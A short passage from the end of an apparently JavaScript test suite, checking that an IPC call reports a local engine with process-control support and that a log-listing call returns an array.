    expect(await ipc.invoke(API.ENGINE_KIND_GET)).toEqual({ engineKind: 'local', supportsProcessControl: true })
    // 后续业务操作正常可用
    expect(await ipc.invoke(API.LOG_LIST, null, 10)).toEqual(expect.any(Array))
  })
})
